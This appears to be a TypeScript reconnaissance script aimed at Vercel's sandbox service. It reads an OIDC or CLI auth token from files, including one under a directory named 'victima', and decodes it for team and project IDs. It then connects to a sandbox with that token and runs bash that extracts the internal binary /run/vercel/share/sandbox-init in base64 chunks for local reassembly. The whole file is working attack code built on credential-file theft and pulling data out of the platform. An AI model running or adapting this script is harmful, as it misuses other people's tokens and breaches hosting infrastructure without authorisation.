import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  // Split binary into 64KB chunks, base64 each, output incrementally.
  const SCRIPT = `
set +e
CHUNK=65536
SIZE=$(stat -c %s /run/vercel/share/sandbox-init)
echo "SIZE=$SIZE"
for ((i=0; i<SIZE; i+=CHUNK)); do
  dd if=/run/vercel/share/sandbox-init bs=1 skip=$i count=$CHUNK 2>/dev/null | base64 -w0
  echo "@$i"
done
echo "DONE_MARKER"
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 120_000 });
  const out = await r.output("both");
  const lines = out.split("DONE_MARKER")[0].trim();
  // Reassemble
  const parts = lines.split("@");
  let buf = Buffer.alloc(0);
  for (const p of parts) {
    const clean = p.replace(/\s+/g, "");
    if (!clean) continue;
    try { buf = Buffer.concat([buf, Buffer.from(clean, "base64")]); } catch {}
  }
  writeFileSync("/tmp/sandbox-init.bin", buf);
  console.log("WROTE /tmp/sandbox-init.bin bytes=" + buf.length);
  console.log("expected SIZE=" + lines.match(/SIZE=(\d+)/)?.[1]);
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });